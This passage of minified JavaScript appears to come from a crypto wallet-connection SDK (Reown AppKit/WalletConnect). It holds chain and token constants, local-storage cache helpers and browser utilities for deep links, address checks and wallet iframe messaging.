T","amDAI","VSQ","VISION","AURUM","pSP","SNX","VC","LINK","CHP","amUSDT","SPHERE","FOX","GIDDY","GFC","OMEN","OX_OLD","DE","WNT"],SUGGESTED_TOKENS_BY_CHAIN:{"eip155:42161":["USD0"]},BALANCE_SUPPORTED_CHAINS:[ge.CHAIN.EVM,ge.CHAIN.SOLANA],SEND_PARAMS_SUPPORTED_CHAINS:[ge.CHAIN.EVM],SWAP_SUPPORTED_NETWORKS:["eip155:1","eip155:42161","eip155:10","eip155:324","eip155:8453","eip155:56","eip155:137","eip155:100","eip155:43114","eip155:250","eip155:8217","eip155:1313161554"],NAMES_SUPPORTED_CHAIN_NAMESPACES:[ge.CHAIN.EVM],ONRAMP_SUPPORTED_CHAIN_NAMESPACES:[ge.CHAIN.EVM,ge.CHAIN.SOLANA],PAY_WITH_EXCHANGE_SUPPORTED_CHAIN_NAMESPACES:[ge.CHAIN.EVM,ge.CHAIN.SOLANA],ACTIVITY_ENABLED_CHAIN_NAMESPACES:[ge.CHAIN.EVM],NATIVE_TOKEN_ADDRESS:{eip155:"0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",solana:"So11111111111111111111111111111111111111111",polkadot:"0x",bip122:"0x",cosmos:"0x",sui:"0x",stacks:"0x",ton:"0x"},CONVERT_SLIPPAGE_TOLERANCE:1,CONNECT_LABELS:{MOBILE:"Open and continue in the wallet app",WEB:"Open and continue in the wallet app"},SEND_SUPPORTED_NAMESPACES:[ge.CHAIN.EVM,ge.CHAIN.SOLANA],DEFAULT_REMOTE_FEATURES:{swaps:["1inch"],onramp:["meld"],email:!0,socials:["google","x","discord","farcaster","github","apple","facebook"],activity:!0,reownBranding:!0,multiWallet:!1,emailCapture:!1,payWithExchange:!1,payments:!1,reownAuthentication:!1},DEFAULT_REMOTE_FEATURES_DISABLED:{email:!1,socials:!1,swaps:!1,onramp:!1,activity:!1,reownBranding:!1,emailCapture:!1,reownAuthentication:!1},DEFAULT_FEATURES:{receive:!0,send:!0,emailShowWallets:!0,connectorTypeOrder:["walletConnect","recent","injected","featured","custom","external","recommended"],analytics:!0,allWallets:!0,legalCheckbox:!1,smartSessions:!1,collapseWallets:!1,walletFeaturesOrder:["onramp","swaps","receive","send"],connectMethodsOrder:void 0,pay:!1,reownAuthentication:!1},DEFAULT_SOCIALS:["google","x","farcaster","discord","apple","github","facebook"],DEFAULT_ACCOUNT_TYPES:{bip122:"payment",eip155:"smartAccount",polkadot:"eoa",solana:"eoa",ton:"eoa"},ADAPTER_TYPES:{UNIVERSAL:"universal",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5",BITCOIN:"bitcoin"},SIWX_DEFAULTS:{signOutOnDisconnect:!0}},Be={cacheExpiry:{portfolio:3e4,nativeBalance:3e4,ens:3e5,identity:3e5,transactionsHistory:15e3,tokenPrice:15e3,latestAppKitVersion:6048e5,tonWallets:864e5},isCacheExpired(t,e){return Date.now()-t>e},getActiveNetworkProps(){const t=Be.getActiveNamespace(),e=Be.getActiveCaipNetworkId(),n=e?e.split(":")[1]:void 0,r=n?isNaN(Number(n))?n:Number(n):void 0;return{namespace:t,caipNetworkId:e,chainId:r}},setWalletConnectDeepLink({name:t,href:e}){try{_t.setItem(St.DEEPLINK_CHOICE,JSON.stringify({href:e,name:t}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const t=_t.getItem(St.DEEPLINK_CHOICE);if(t)return JSON.parse(t)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{_t.removeItem(St.DEEPLINK_CHOICE)}catch{console.info("Unable to delete WalletConnect deep link")}},setActiveNamespace(t){try{_t.setItem(St.ACTIVE_NAMESPACE,t)}catch{console.info("Unable to set active namespace")}},setActiveCaipNetworkId(t){try{_t.setItem(St.ACTIVE_CAIP_NETWORK_ID,t),Be.setActiveNamespace(t.split(":")[0])}catch{console.info("Unable to set active caip network id")}},getActiveCaipNetworkId(){try{return _t.getItem(St.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to get active caip network id");return}},deleteActiveCaipNetworkId(){try{_t.removeItem(St.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to delete active caip network id")}},deleteConnectedConnectorId(t){try{const e=AN(t);_t.removeItem(e)}catch{console.info("Unable to delete connected connector id")}},setAppKitRecent(t){try{const e=Be.getRecentWallets();e.find(r=>r.id===t.id)||(e.unshift(t),e.length>2&&e.pop(),_t.setItem(St.RECENT_WALLETS,JSON.stringify(e)),_t.setItem(St.RECENT_WALLET,JSON.stringify(t)))}catch{console.info("Unable to set AppKit recent")}},getRecentWallets(){try{const t=_t.getItem(St.RECENT_WALLETS);return t?JSON.parse(t):[]}catch{console.info("Unable to get AppKit recent")}return[]},getRecentWallet(){try{const t=_t.getItem(St.RECENT_WALLET);return t?JSON.parse(t):null}catch{console.info("Unable to get AppKit recent")}return null},deleteRecentWallet(){try{_t.removeItem(St.RECENT_WALLET)}catch{console.info("Unable to delete AppKit recent")}},setConnectedConnectorId(t,e){try{const n=AN(t);_t.setItem(n,e)}catch{console.info("Unable to set Connected Connector Id")}},getActiveNamespace(){try{return _t.getItem(St.ACTIVE_NAMESPACE)}catch{console.info("Unable to get active namespace")}},getConnectedConnectorId(t){if(t)try{const e=AN(t);return _t.getItem(e)}catch{console.info("Unable to get connected connector id in namespace",t)}},setConnectedSocialProvider(t){try{_t.setItem(St.CONNECTED_SOCIAL,t)}catch{console.info("Unable to set connected social provider")}},getConnectedSocialProvider(){try{return _t.getItem(St.CONNECTED_SOCIAL)}catch{console.info("Unable to get connected social provider")}},deleteConnectedSocialProvider(){try{_t.removeItem(St.CONNECTED_SOCIAL)}catch{console.info("Unable to delete connected social provider")}},getConnectedSocialUsername(){try{return _t.getItem(St.CONNECTED_SOCIAL_USERNAME)}catch{console.info("Unable to get connected social username")}},getStoredActiveCaipNetworkId(){return _t.getItem(St.ACTIVE_CAIP_NETWORK_ID)?.split(":")?.[1]},setConnectionStatus(t){try{_t.setItem(St.CONNECTION_STATUS,t)}catch{console.info("Unable to set connection status")}},getConnectionStatus(){try{return _t.getItem(St.CONNECTION_STATUS)}catch{return}},getConnectedNamespaces(){try{const t=_t.getItem(St.CONNECTED_NAMESPACES);return t?.length?t.split(","):[]}catch{return[]}},setConnectedNamespaces(t){try{const e=Array.from(new Set(t));_t.setItem(St.CONNECTED_NAMESPACES,e.join(","))}catch{console.info("Unable to set namespaces in storage")}},addConnectedNamespace(t){try{const e=Be.getConnectedNamespaces();e.includes(t)||(e.push(t),Be.setConnectedNamespaces(e))}catch{console.info("Unable to add connected namespace")}},removeConnectedNamespace(t){try{const e=Be.getConnectedNamespaces(),n=e.indexOf(t);n>-1&&(e.splice(n,1),Be.setConnectedNamespaces(e))}catch{console.info("Unable to remove connected namespace")}},getTelegramSocialProvider(){try{return _t.getItem(St.TELEGRAM_SOCIAL_PROVIDER)}catch{return console.info("Unable to get telegram social provider"),null}},setTelegramSocialProvider(t){try{_t.setItem(St.TELEGRAM_SOCIAL_PROVIDER,t)}catch{console.info("Unable to set telegram social provider")}},removeTelegramSocialProvider(){try{_t.removeItem(St.TELEGRAM_SOCIAL_PROVIDER)}catch{console.info("Unable to remove telegram social provider")}},getBalanceCache(){let t={};try{const e=_t.getItem(St.PORTFOLIO_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromBalanceCache(t){try{const e=Be.getBalanceCache();_t.setItem(St.PORTFOLIO_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getBalanceCacheForCaipAddress(t){try{const n=Be.getBalanceCache()[t];if(n&&!this.isCacheExpired(n.timestamp,this.cacheExpiry.portfolio))return n.balance;Be.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateBalanceCache(t){try{const e=Be.getBalanceCache();e[t.caipAddress]=t,_t.setItem(St.PORTFOLIO_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getNativeBalanceCache(){let t={};try{const e=_t.getItem(St.NATIVE_BALANCE_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get balance cache")}return t},removeAddressFromNativeBalanceCache(t){try{const e=Be.getBalanceCache();_t.setItem(St.NATIVE_BALANCE_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove address from balance cache",t)}},getNativeBalanceCacheForCaipAddress(t){try{const n=Be.getNativeBalanceCache()[t];if(n&&!this.isCacheExpired(n.timestamp,this.cacheExpiry.nativeBalance))return n;console.info("Discarding cache for address",t),Be.removeAddressFromBalanceCache(t)}catch{console.info("Unable to get balance cache for address",t)}},updateNativeBalanceCache(t){try{const e=Be.getNativeBalanceCache();e[t.caipAddress]=t,_t.setItem(St.NATIVE_BALANCE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update balance cache",t)}},getEnsCache(){let t={};try{const e=_t.getItem(St.ENS_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get ens name cache")}return t},getEnsFromCacheForAddress(t){try{const n=Be.getEnsCache()[t];if(n&&!this.isCacheExpired(n.timestamp,this.cacheExpiry.ens))return n.ens;Be.removeEnsFromCache(t)}catch{console.info("Unable to get ens name from cache",t)}},updateEnsCache(t){try{const e=Be.getEnsCache();e[t.address]=t,_t.setItem(St.ENS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ens name cache",t)}},removeEnsFromCache(t){try{const e=Be.getEnsCache();_t.setItem(St.ENS_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove ens name from cache",t)}},getIdentityCache(){let t={};try{const e=_t.getItem(St.IDENTITY_CACHE);t=e?JSON.parse(e):{}}catch{console.info("Unable to get identity cache")}return t},getIdentityFromCacheForAddress(t){try{const n=Be.getIdentityCache()[t];if(n&&!this.isCacheExpired(n.timestamp,this.cacheExpiry.identity))return n.identity;Be.removeIdentityFromCache(t)}catch{console.info("Unable to get identity from cache",t)}},updateIdentityCache(t){try{const e=Be.getIdentityCache();e[t.address]={identity:t.identity,timestamp:t.timestamp},_t.setItem(St.IDENTITY_CACHE,JSON.stringify(e))}catch{console.info("Unable to update identity cache",t)}},removeIdentityFromCache(t){try{const e=Be.getIdentityCache();_t.setItem(St.IDENTITY_CACHE,JSON.stringify({...e,[t]:void 0}))}catch{console.info("Unable to remove identity from cache",t)}},getTonWalletsCache(){try{const t=_t.getItem(St.TON_WALLETS_CACHE),e=t?JSON.parse(t):void 0;if(e&&!this.isCacheExpired(e.timestamp,this.cacheExpiry.tonWallets))return e;Be.removeTonWalletsCache()}catch{console.info("Unable to get ton wallets cache")}},updateTonWalletsCache(t){try{const e=Be.getTonWalletsCache()||{timestamp:0,wallets:[]};e.timestamp=new Date().getTime(),e.wallets=t,_t.setItem(St.TON_WALLETS_CACHE,JSON.stringify(e))}catch{console.info("Unable to update ton wallets cache",t)}},removeTonWalletsCache(){try{_t.removeItem(St.TON_WALLETS_CACHE)}catch{console.info("Unable to remove ton wallets cache")}},clearAddressCache(){try{_t.removeItem(St.PORTFOLIO_CACHE),_t.removeItem(St.NATIVE_BALANCE_CACHE),_t.removeItem(St.ENS_CACHE),_t.removeItem(St.IDENTITY_CACHE),_t.removeItem(St.HISTORY_TRANSACTIONS_CACHE)}catch{console.info("Unable to clear address cache")}},setPreferredAccountTypes(t){try{_t.setItem(St.PREFERRED_ACCOUNT_TYPES,JSON.stringify(t))}catch{console.info("Unable to set preferred account types",t)}},getPreferredAccountTypes(){try{const t=_t.getItem(St.PREFERRED_ACCOUNT_TYPES);return t?JSON.parse(t):{}}catch{console.info("Unable to get preferred account types")}return{}},setConnections(t,e){try{const n=Be.getConnections(),r=n[e]??[],i=new Map;for(const o of r)i.set(o.connectorId,{...o});for(const o of t){const a=i.get(o.connectorId),c=o.connectorId===ge.CONNECTOR_ID.AUTH;if(a&&!c){const l=new Set(a.accounts.map(h=>h.address.toLowerCase())),f=o.accounts.filter(h=>!l.has(h.address.toLowerCase()));a.accounts.push(...f)}else i.set(o.connectorId,{...o})}const s={...n,[e]:Array.from(i.values())};_t.setItem(St.CONNECTIONS,JSON.stringify(s))}catch(n){console.error("Unable to sync connections to storage",n)}},getConnections(){try{const t=_t.getItem(St.CONNECTIONS);return t?JSON.parse(t):{}}catch(t){return console.error("Unable to get connections from storage",t),{}}},deleteAddressFromConnection({connectorId:t,address:e,namespace:n}){try{const r=Be.getConnections(),i=r[n]??[],s=new Map(i.map(a=>[a.connectorId,a])),o=s.get(t);o&&(o.accounts.filter(c=>c.address.toLowerCase()!==e.toLowerCase()).length===0?s.delete(t):s.set(t,{...o,accounts:o.accounts.filter(c=>c.address.toLowerCase()!==e.toLowerCase())})),_t.setItem(St.CONNECTIONS,JSON.stringify({...r,[n]:Array.from(s.values())}))}catch{console.error(`Unable to remove address "${e}" from connector "${t}" in namespace "${n}"`)}},getDisconnectedConnectorIds(){try{const t=_t.getItem(St.DISCONNECTED_CONNECTOR_IDS);return t?JSON.parse(t):{}}catch{console.info("Unable to get disconnected connector ids")}return{}},addDisconnectedConnectorId(t,e){try{const n=Be.getDisconnectedConnectorIds(),r=n[e]??[];r.push(t),_t.setItem(St.DISCONNECTED_CONNECTOR_IDS,JSON.stringify({...n,[e]:Array.from(new Set(r))}))}catch{console.error(`Unable to set disconnected connector id "${t}" for namespace "${e}"`)}},removeDisconnectedConnectorId(t,e){try{const n=Be.getDisconnectedConnectorIds();let r=n[e]??[];r=r.filter(i=>i.toLowerCase()!==t.toLowerCase()),_t.setItem(St.DISCONNECTED_CONNECTOR_IDS,JSON.stringify({...n,[e]:Array.from(new Set(r))}))}catch{console.error(`Unable to remove disconnected connector id "${t}" for namespace "${e}"`)}},isConnectorDisconnected(t,e){try{return(Be.getDisconnectedConnectorIds()[e]??[]).some(i=>i.toLowerCase()===t.toLowerCase())}catch{console.info(`Unable to get disconnected connector id "${t}" for namespace "${e}"`)}return!1},getTransactionsCache(){try{const t=_t.getItem(St.HISTORY_TRANSACTIONS_CACHE);return t?JSON.parse(t):{}}catch{console.info("Unable to get transactions cache")}return{}},getTransactionsCacheForAddress({address:t,chainId:e=""}){try{const r=Be.getTransactionsCache()[t]?.[e];if(r&&!this.isCacheExpired(r.timestamp,this.cacheExpiry.transactionsHistory))return r.transactions;Be.removeTransactionsCache({address:t,chainId:e})}catch{console.info("Unable to get transactions cache")}},updateTransactionsCache({address:t,chainId:e="",timestamp:n,transactions:r}){try{const i=Be.getTransactionsCache();i[t]={...i[t],[e]:{timestamp:n,transactions:r}},_t.setItem(St.HISTORY_TRANSACTIONS_CACHE,JSON.stringify(i))}catch{console.info("Unable to update transactions cache",{address:t,chainId:e,timestamp:n,transactions:r})}},removeTransactionsCache({address:t,chainId:e}){try{const n=Be.getTransactionsCache(),r=n?.[t]||{},{[e]:i,...s}=r;_t.setItem(St.HISTORY_TRANSACTIONS_CACHE,JSON.stringify({...n,[t]:s}))}catch{console.info("Unable to remove transactions cache",{address:t,chainId:e})}},getTokenPriceCache(){try{const t=_t.getItem(St.TOKEN_PRICE_CACHE);return t?JSON.parse(t):{}}catch{console.info("Unable to get token price cache")}return{}},getTokenPriceCacheForAddresses(t){try{const n=Be.getTokenPriceCache()[t.join(",")];if(n&&!this.isCacheExpired(n.timestamp,this.cacheExpiry.tokenPrice))return n.tokenPrice;Be.removeTokenPriceCache(t)}catch{console.info("Unable to get token price cache for addresses",t)}},updateTokenPriceCache(t){try{const e=Be.getTokenPriceCache();e[t.addresses.join(",")]={timestamp:t.timestamp,tokenPrice:t.tokenPrice},_t.setItem(St.TOKEN_PRICE_CACHE,JSON.stringify(e))}catch{console.info("Unable to update token price cache",t)}},removeTokenPriceCache(t){try{const e=Be.getTokenPriceCache();_t.setItem(St.TOKEN_PRICE_CACHE,JSON.stringify({...e,[t.join(",")]:void 0}))}catch{console.info("Unable to remove token price cache",t)}},getLatestAppKitVersion(){try{const t=this.getLatestAppKitVersionCache(),e=t?.version;return e&&!this.isCacheExpired(t.timestamp,this.cacheExpiry.latestAppKitVersion)?e:void 0}catch{console.info("Unable to get latest AppKit version")}},getLatestAppKitVersionCache(){try{const t=_t.getItem(St.LATEST_APPKIT_VERSION);return t?JSON.parse(t):{}}catch{console.info("Unable to get latest AppKit version cache")}return{}},updateLatestAppKitVersion(t){try{const e=Be.getLatestAppKitVersionCache();e.timestamp=t.timestamp,e.version=t.version,_t.setItem(St.LATEST_APPKIT_VERSION,JSON.stringify(e))}catch{console.info("Unable to update latest AppKit version on local storage",t)}}},xe={getWindow(){if(!(typeof window>"u"))return window},isMobile(){return this.isClient()?!!(window?.matchMedia&&typeof window.matchMedia=="function"&&window.matchMedia("(pointer:coarse)")?.matches||/Android|webOS|iPhone|iPad|iPod|BlackBerry|Opera Mini/u.test(navigator.userAgent)):!1},checkCaipNetwork(t,e=""){return t?.caipNetworkId.toLocaleLowerCase().includes(e.toLowerCase())},isAndroid(){if(!this.isMobile())return!1;const t=window?.navigator.userAgent.toLowerCase();return xe.isMobile()&&t.includes("android")},isIos(){if(!this.isMobile())return!1;const t=window?.navigator.userAgent.toLowerCase();return t.includes("iphone")||t.includes("ipad")},isSafari(){return this.isClient()?(window?.navigator.userAgent.toLowerCase()).includes("safari"):!1},isClient(){return typeof window<"u"},isPairingExpired(t){return t?t-Date.now()<=jt.TEN_SEC_MS:!0},isAllowedRetry(t,e=jt.ONE_SEC_MS){return Date.now()-t>=e},copyToClopboard(t){navigator.clipboard.writeText(t)},isIframe(){try{return window?.self!==window?.top}catch{return!1}},isSafeApp(){if(xe.isClient()&&window.self!==window.top)try{const t=window?.location?.ancestorOrigins?.[0],e="https://app.safe.global";if(t){const n=new URL(t),r=new URL(e);return n.hostname===r.hostname}}catch{return!1}return!1},getPairingExpiry(){return Date.now()+jt.FOUR_MINUTES_MS},getNetworkId(t){return t?.split(":")[1]},getPlainAddress(t){return t?.split(":")[2]},async wait(t){return new Promise(e=>{setTimeout(e,t)})},debounce(t,e=500){let n;return(...r)=>{function i(){t(...r)}n&&clearTimeout(n),n=setTimeout(i,e)}},isHttpUrl(t){return t.startsWith("http://")||t.startsWith("https://")},formatNativeUrl(t,e,n=null){if(xe.isHttpUrl(t))return this.formatUniversalUrl(t,e);let r=t,i=n;r.includes("://")||(r=t.replaceAll("/","").replaceAll(":",""),r=`${r}://`),r.endsWith("/")||(r=`${r}/`),i&&!i?.endsWith("/")&&(i=`${i}/`),this.isTelegram()&&this.isAndroid()&&(e=encodeURIComponent(e));const s=encodeURIComponent(e);return{redirect:`${r}wc?uri=${s}`,redirectUniversalLink:i?`${i}wc?uri=${s}`:void 0,href:r}},formatUniversalUrl(t,e){if(!xe.isHttpUrl(t))return this.formatNativeUrl(t,e);let n=t;n.endsWith("/")||(n=`${n}/`);const r=encodeURIComponent(e);return{redirect:`${n}wc?uri=${r}`,href:n}},getOpenTargetForPlatform(t){return t==="popupWindow"?t:this.isTelegram()?Be.getTelegramSocialProvider()?"_top":"_blank":t},openHref(t,e,n){window?.open(t,this.getOpenTargetForPlatform(e),n||"noreferrer noopener")},returnOpenHref(t,e,n){return window?.open(t,this.getOpenTargetForPlatform(e),n||"noreferrer noopener")},isTelegram(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)},isPWA(){if(typeof window>"u")return!1;const t=window?.matchMedia&&typeof window.matchMedia=="function"?window.matchMedia("(display-mode: standalone)")?.matches:!1,e=window?.navigator?.standalone;return!!(t||e)},async preloadImage(t){const e=new Promise((n,r)=>{const i=new Image;i.onload=n,i.onerror=r,i.crossOrigin="anonymous",i.src=t});return Promise.race([e,xe.wait(2e3)])},parseBalance(t,e){let n="0.000";if(typeof t=="string"){const c=Number(t);if(!isNaN(c)){const l=(Math.floor(c*1e3)/1e3).toFixed(3);l&&(n=l)}}const[r,i]=n.split("."),s=r||"0",o=i||"000";return{formattedText:`${s}.${o}${e?` ${e}`:""}`,value:s,decimals:o,symbol:e}},getApiUrl(){return ge.W3M_API_URL},getBlockchainApiUrl(){return ge.BLOCKCHAIN_API_RPC_URL},getAnalyticsUrl(){return ge.PULSE_API_URL},getUUID(){return crypto?.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})},parseError(t){return typeof t=="string"?t:typeof t?.issues?.[0]?.message=="string"?t.issues[0].message:t instanceof Error?t.message:"Unknown error"},sortRequestedNetworks(t,e=[]){const n={};return e&&t&&(t.forEach((r,i)=>{n[r]=i}),e.sort((r,i)=>{const s=n[r.id],o=n[i.id];return s!==void 0&&o!==void 0?s-o:s!==void 0?-1:o!==void 0?1:0})),e},calculateBalance(t){let e=0;for(const n of t)e+=n.value??0;return e},formatTokenBalance(t){const e=t.toFixed(2),[n,r]=e.split(".");return{dollars:n,pennies:r}},isAddress(t,e="eip155"){switch(e){case"eip155":if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)){if(/^(?:0x)?[0-9a-f]{40}$/iu.test(t)||/^(?:0x)?[0-9A-F]{40}$/iu.test(t))return!0}else return!1;return!1;case"solana":return/[1-9A-HJ-NP-Za-km-z]{32,44}$/iu.test(t);default:return!1}},uniqueBy(t,e){const n=new Set;return t.filter(r=>{const i=r[e];return n.has(i)?!1:(n.add(i),!0)})},generateSdkVersion(t,e,n){const i=t.length===0?jt.ADAPTER_TYPES.UNIVERSAL:t.map(s=>s.adapterType).join(",");return`${e}-${i}-${n}`},createAccount(t,e,n,r,i){return{namespace:t,address:e,type:n,publicKey:r,path:i}},isCaipAddress(t){if(typeof t!="string")return!1;const e=t.split(":"),n=e[0];return e.filter(Boolean).length===3&&n in ge.CHAIN_NAME_MAP},getAccount(t){return t?typeof t=="string"?{address:t,chainId:void 0}:{address:t.address,chainId:t.chainId}:{address:void 0,chainId:void 0}},isMac(){const t=window?.navigator.userAgent.toLowerCase();return t.includes("macintosh")&&!t.includes("safari")},formatTelegramSocialLoginUrl(t){const e=`--${encodeURIComponent(window?.location.href)}`,n="state=";if(new URL(t).host==="auth.magic.link"){const i="provider_authorization_url=",s=t.substring(t.indexOf(i)+i.length),o=this.injectIntoUrl(decodeURIComponent(s),n,e);return t.replace(s,encodeURIComponent(o))}return this.injectIntoUrl(t,n,e)},injectIntoUrl(t,e,n){const r=t.indexOf(e);if(r===-1)throw new Error(`${e} parameter not found in the URL: ${t}`);const i=t.indexOf("&",r),s=e.length,o=i!==-1?i:t.length,a=t.substring(0,r+s),c=t.substring(r+s,o),l=t.substring(i),f=c+n;return a+f+l}};var y1={};const hme="https://secure.walletconnect.org/sdk",pme=(typeof process<"u"&&typeof y1<"u"?y1.NEXT_PUBLIC_SECURE_SITE_SDK_URL:void 0)||hme,mme=(typeof process<"u"&&typeof y1<"u"?y1.NEXT_PUBLIC_DEFAULT_LOG_LEVEL:void 0)||"error",gme=(typeof process<"u"&&typeof y1<"u"?y1.NEXT_PUBLIC_SECURE_SITE_SDK_VERSION:void 0)||"4",bt={APP_EVENT_KEY:"@w3m-app/",FRAME_EVENT_KEY:"@w3m-frame/",RPC_METHOD_KEY:"RPC_",STORAGE_KEY:"@appkit-wallet/",SESSION_TOKEN_KEY:"SESSION_TOKEN_KEY",EMAIL_LOGIN_USED_KEY:"EMAIL_LOGIN_USED_KEY",LAST_USED_CHAIN_KEY:"LAST_USED_CHAIN_KEY",LAST_EMAIL_LOGIN_TIME:"LAST_EMAIL_LOGIN_TIME",EMAIL:"EMAIL",PREFERRED_ACCOUNT_TYPE:"PREFERRED_ACCOUNT_TYPE",SMART_ACCOUNT_ENABLED:"SMART_ACCOUNT_ENABLED",SMART_ACCOUNT_ENABLED_NETWORKS:"SMART_ACCOUNT_ENABLED_NETWORKS",SOCIAL_USERNAME:"SOCIAL_USERNAME",APP_SWITCH_NETWORK:"@w3m-app/SWITCH_NETWORK",APP_CONNECT_EMAIL:"@w3m-app/CONNECT_EMAIL",APP_CONNECT_DEVICE:"@w3m-app/CONNECT_DEVICE",APP_CONNECT_OTP:"@w3m-app/CONNECT_OTP",APP_CONNECT_SOCIAL:"@w3m-app/CONNECT_SOCIAL",APP_GET_SOCIAL_REDIRECT_URI:"@w3m-app/GET_SOCIAL_REDIRECT_URI",APP_GET_USER:"@w3m-app/GET_USER",APP_SIGN_OUT:"@w3m-app/SIGN_OUT",APP_IS_CONNECTED:"@w3m-app/IS_CONNECTED",APP_GET_CHAIN_ID:"@w3m-app/GET_CHAIN_ID",APP_RPC_REQUEST:"@w3m-app/RPC_REQUEST",APP_UPDATE_EMAIL:"@w3m-app/UPDATE_EMAIL",APP_UPDATE_EMAIL_PRIMARY_OTP:"@w3m-app/UPDATE_EMAIL_PRIMARY_OTP",APP_UPDATE_EMAIL_SECONDARY_OTP:"@w3m-app/UPDATE_EMAIL_SECONDARY_OTP",APP_AWAIT_UPDATE_EMAIL:"@w3m-app/AWAIT_UPDATE_EMAIL",APP_SYNC_THEME:"@w3m-app/SYNC_THEME",APP_SYNC_DAPP_DATA:"@w3m-app/SYNC_DAPP_DATA",APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS:"@w3m-app/GET_SMART_ACCOUNT_ENABLED_NETWORKS",APP_INIT_SMART_ACCOUNT:"@w3m-app/INIT_SMART_ACCOUNT",APP_SET_PREFERRED_ACCOUNT:"@w3m-app/SET_PREFERRED_ACCOUNT",APP_CONNECT_FARCASTER:"@w3m-app/CONNECT_FARCASTER",APP_GET_FARCASTER_URI:"@w3m-app/GET_FARCASTER_URI",APP_RELOAD:"@w3m-app/RELOAD",APP_RPC_ABORT:"@w3m-app/RPC_ABORT",FRAME_SWITCH_NETWORK_ERROR:"@w3m-frame/SWITCH_NETWORK_ERROR",FRAME_SWITCH_NETWORK_SUCCESS:"@w3m-frame/SWITCH_NETWORK_SUCCESS",FRAME_CONNECT_EMAIL_ERROR:"@w3m-frame/CONNECT_EMAIL_ERROR",FRAME_CONNECT_EMAIL_SUCCESS:"@w3m-frame/CONNECT_EMAIL_SUCCESS",FRAME_CONNECT_DEVICE_ERROR:"@w3m-frame/CONNECT_DEVICE_ERROR",FRAME_CONNECT_DEVICE_SUCCESS:"@w3m-frame/CONNECT_DEVICE_SUCCESS",FRAME_CONNECT_OTP_SUCCESS:"@w3m-frame/CONNECT_OTP_SUCCESS",FRAME_CONNECT_OTP_ERROR:"@w3m-frame/CONNECT_OTP_ERROR",FRAME_CONNECT_SOCIAL_SUCCESS:"@w3m-frame/CONNECT_SOCIAL_SUCCESS",FRAME_CONNECT_SOCIAL_ERROR:"@w3m-frame/CONNECT_SOCIAL_ERROR",FRAME_CONNECT_FARCASTER_SUCCESS:"@w3m-frame/CONNECT_FARCASTER_SUCCESS",FRAME_CONNECT_FARCASTER_ERROR:"@w3m-frame/CONNECT_FARCASTER_ERROR",FRAME_GET_FARCASTER_URI_SUCCESS:"@w3m-frame/GET_FARCASTER_URI_SUCCESS",FRAME_GET_FARCASTER_URI_ERROR:"@w3m-frame/GET_FARCASTER_URI_ERROR",FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_SUCCESS",FRAME_GET_SOCIAL_REDIRECT_URI_ERROR:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_ERROR",FRAME_GET_USER_SUCCESS:"@w3m-frame/GET_USER_SUCCESS",FRAME_GET_USER_ERROR:"@w3m-frame/GET_USER_ERROR",FRAME_SIGN_OUT_SUCCESS:"@w3m-frame/SIGN_OUT_SUCCESS",FRAME_SIGN_OUT_ERROR:"@w3m-frame/SIGN_OUT_ERROR",FRAME_IS_CONNECTED_SUCCESS:"@w3m-frame/IS_CONNECTED_SUCCESS",FRAME_IS_CONNECTED_ERROR:"@w3m-frame/IS_CONNECTED_ERROR",FRAME_GET_CHAIN_ID_SUCCESS:"@w3m-frame/GET_CHAIN_ID_SUCCESS",FRAME_GET_CHAIN_ID_ERROR:"@w3m-frame/GET_CHAIN_ID_ERROR",FRAME_RPC_REQUEST_SUCCESS:"@w3m-frame/RPC_REQUEST_SUCCESS",FRAME_RPC_REQUEST_ERROR:"@w3m-frame/RPC_REQUEST_ERROR",FRAME_SESSION_UPDATE:"@w3m-frame/SESSION_UPDATE",FRAME_UPDATE_EMAIL_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SUCCESS",FRAME_UPDATE_EMAIL_ERROR:"@w3m-frame/UPDATE_EMAIL_ERROR",FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_ERROR",FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_ERROR",FRAME_SYNC_THEME_SUCCESS:"@w3m-frame/SYNC_THEME_SUCCESS",FRAME_SYNC_THEME_ERROR:"@w3m-frame/SYNC_THEME_ERROR",FRAME_SYNC_DAPP_DATA_SUCCESS:"@w3m-frame/SYNC_DAPP_DATA_SUCCESS",FRAME_SYNC_DAPP_DATA_ERROR:"@w3m-frame/SYNC_DAPP_DATA_ERROR",FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS",FRA